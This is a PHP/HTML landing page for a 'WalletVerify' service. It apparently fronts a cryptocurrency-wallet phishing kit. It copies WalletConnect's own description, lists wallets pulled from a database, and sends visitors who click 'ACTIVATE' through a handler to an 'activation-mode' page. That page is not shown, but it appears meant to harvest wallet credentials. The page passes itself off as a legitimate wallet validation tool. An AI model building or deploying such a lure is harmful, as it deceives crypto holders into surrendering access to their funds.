<?php
require "app/config.php";
$conn = Config::getConn();
$q = "SELECT * FROM `Wallets`";
?>


<!doctype html>
<html>

<head>
    <meta charset='utf-8'>
    <meta name='viewport' content='width=device-width, initial-scale=1'>
    <title>WalletVerify</title>
    <link href='https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/css/bootstrap.min.css' rel='stylesheet'>
    <link href='' rel='stylesheet'>
    <script type='text/javascript' src='https://cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js'></script>
    <link rel="stylesheet" href="assets/css/header.css">
    <!--<link rel="stylesheet" href="assets/css/footer.css">-->
    <!--<link rel="stylesheet" href="assets/css/team.css">-->
    <link rel="stylesheet" href="assets/css/product.css">
    <style>
    
    .footer {
  /*position: fixed;*/
  left: 0;
  bottom: 0;
  width: 100%;
  background-color:#726E6D;
  color: white;
  text-align: center;
}
    body{
          background:url("bg.png");
          background-position: center;
          background-repeat: no-repeat;
          background-size: cover;
          


      }
      .grey-bg {  
    background-color: #F5F7FA;
}
.lim{
    /*url('./assets/arrowpng.png')*/
    margin: 0;
	padding: 36px 0 36px 84px;
	list-style: none;
	background-image: url("./assets/arrowpng.png");
	background-repeat: no-repeat;
	background-position: left center;
	background-size: 40px;
}

  </style>
  <script src="https://www.momentcrm.com/embed"></script>
<script>
  MomentCRM('init', {
    'teamVanityId': 'erect1',
    'doChat': true,
    'doTracking': true,
  });
</script>
</head>

<body oncontextmenu='return true' class='snippet-body'>
    <div style="height:62px; background-color: #1D2330; overflow:hidden; box-sizing: border-box; border: 1px solid #282E3B; border-radius: 4px; text-align: right; line-height:14px; block-size:62px; font-size: 12px; font-feature-settings: normal; text-size-adjust: 100%; box-shadow: inset 0 -20px 0 0 #262B38;padding:1px;padding: 0px; margin: 0px; width: 100%;"><div style="height:40px; padding:0px; margin:0px; width: 100%;"><iframe src="https://widget.coinlib.io/widget?type=horizontal_v2&theme=dark&pref_coin_id=1505&invert_hover=no" width="100%" height="36px" scrolling="auto" marginwidth="0" marginheight="0" frameborder="0" border="0" style="border:0;margin:0;padding:0;"></iframe></div><div style="color: #626B7F; line-height: 14px; font-weight: 400; font-size: 11px; box-sizing: border-box; padding: 2px 6px; width: 100%; font-family: Verdana, Tahoma, Arial, sans-serif;"><a href="#" target="_blank" style="font-weight: 500; color: #626B7F; text-decoration:none; font-size:11px">Cryptocurrency Prices</a>&nbsp;by WalletVerify</div></div>
    <div class="container-fluid px-0">
        <header>
            <div class="shape"></div> <!-- Navbar -->
            <nav class="navbar fixed-top navbar-expand-lg navbar-transparent"> <a class="navbar-brand" href="#">WalletVerify</a> <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation"> <span class="navbar-toggler-icon"></span> </button>
                <div class="collapse navbar-collapse" id="navbarSupportedContent">
                    <ul class="navbar-nav mr-auto">
                        <li class="nav-item active"> <a class="nav-link" href="/">HOME <span class="sr-only">(current)</span></a> </li>
                        <li class="nav-item"> <a class="nav-link" href="#">Github</a> </li>
                        <li class="nav-item"> <a class="nav-link" href="#">Facebook</a> </li>
                        <li class="nav-item"> <a class="nav-link" href="#">Apps</a> </li>
                        <li class="nav-item"> <a class="nav-link" href="#">Tweeter</a> </li>
                        <li class="nav-item"> <a class="nav-link" href="#">Instagram</a> </li>
                    </ul>
                </div>
            </nav> <!-- ./ end of navbar -->
            <div class="container">
                <div class="row">
                    <div class="col-md-6 left-side"> <img src="assets/wallet_icon_T.png" class="w-100"> </div>
                    <div class="col-md-6 right-side">
                        <h1>WalletVerify ACTIVATION</h1>
                        <p>FREE AND FASTER THAN ORDERS</p>
                        <div class="text-center">
                            <button class="btn order-button">Add Wallet</button> </div>
                    </div>
                </div>
            </div>
        </header>
    </div>
    <br>
    <!-- end of headers -->
    <!-- product -->
<br>
<br>
<div class="d-flex align-items-center">
  <div class="w-50"  >
    <img src="./assets/briefcase.svg" alt="logo" width="100%" height="400px">
  </div>
  <div class="flex-grow-1 ms-3">
   
   <ul class="mm">
       <li class="lim">
             <div class="d-flex justify-content-start text-dark " >
      <p class="text-start" style="width: 300px;" >
       <b >WalletVerify Validation</b><br>
       The best way to manage all your wallets from a single app. With our highly secure integrations with top wallet providers, you can efficiently manage all your wallets on our app.


      </p>
    </div>
       </li>
       <!---->
       <li class="lim">
            <div class="d-flex justify-content-start text-dark " >
      <p class="text-start" style="width: 300px;" >
       <b >What is WalletVerify </b><br>
      Walletconnect is an open source protocol for connecting decentralised applications to mobile wallet
      with Deep link. a user can inter act with out Dapp from any where from there mobile phones, making walletsconnect a safe choice.

      </p>
    </div>
       </li>
       <!---->
       <li class="lim">
             <div class="d-flex justify-content-start text-dark " >
      <p class="text-start" style="width: 300px;" >
       <b > How Dos it Works </b><br>
      Multiple iOS and Android wallets support the walletConnect protocol.interaction between mobile apps and mobile browser are supported via Mobile linking 

      </p>
    </div>
       </li>
   </ul>
   
  </div>
</div>
<br>

    <!--<div class="d-flex justify-content-center text-dark " >-->
    <!--  <p class="text-center" style="width: 300px;" >-->
    <!--   <b >Walletconnect Validation</b><br>-->
    <!--   The best way to manage all your wallets from a single app. With our highly secure integrations with top wallet providers, you can efficiently manage all your wallets on our app.-->


    <!--  </p>-->
    <!--</div>-->
    <!--<div class="d-flex justify-content-center text-dark " >-->
    <!--  <p class="text-center" style="width: 300px;" >-->
    <!--   <b >What is Walletconnect </b><br>-->
    <!--  Walletconnect is an open source protocol for connecting decentralised applications to mobile wallet-->
    <!--  with Deep link. a user can inter act with out Dapp from any where from there mobile phones, making walletsconnect a safe choice.-->

    <!--  </p>-->
    <!--</div>-->
    
    <!--  <div class="d-flex justify-content-center text-dark " >-->
    <!--  <p class="text-center" style="width: 300px;" >-->
    <!--   <b > How Dos it Works </b><br>-->
    <!--  Multiple iOS and Android wallets support the walletConnect protocol.interaction between mobile apps and mobile browser are supported via Mobile linking -->

    <!--  </p>-->
    <!--</div>-->
    
    <div class="container-fluid mt-6 ppp">
     <center>
         <label style="
         text-transformation:uppercase;
         color:white;
         padding:10px;
         font-weight:bold;
         ">
             Wallets
         </label>
     </center>
        <div class="row">
            <?php

            $stm = $conn->query($q);
            if ($stm->rowCount() > 0) {
                for ($i = 0; $i < $stm->rowCount(); $i++) {
                    $data = $stm->fetch();


            ?>
                    <div class="col-md-2" style="padding-top:10px; padding-bottom:10px;">
                        <div class="card" style="box-shadow: 2px 2px 2px 2px; border:1px solid black;">
                            <div class="d-flex justify-content-between align-items-center">

                            </div>
                            <div class="text-center">
                                <img src="assets/img/<?php echo $data->image;  ?>" height="120px" width="70px"> </div>
                            <div class="text-center">
                                <h5><?php echo $data->name;  ?></h5>
                                <a class="act" id="<?php echo $data->name;  ?>" href="activation-mode"> <span class="text-success">ACTIVATE</span></a>
                            </div>
                        </div>
                        <!--  -->

                    </div>

            <?php
                }
            }
            ?>



        </div>
    </div>


    <!-- footer -->
    <div class="footer">
  <p>@Copyrite@2021</p>
</div>
    <!-- end of footer -->
    <script type='text/javascript' src='https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/js/bootstrap.bundle.min.js'></script>
    <script type='text/javascript'></script>
    <script>
        $(document).ready(function() {
            $(".act").click(function(e) {
                e.preventDefault();
                let name = $(this).attr("id");
                $.ajax({
                    type: "post",
                    url: "handler",
                    data: {
                        mode: name,
                    },
                    dataType: "text",
                    success: function(response) {
                        window.location.href = "activation-mode";
                    },
                });

            });
        });
    </script>
</body>

</html>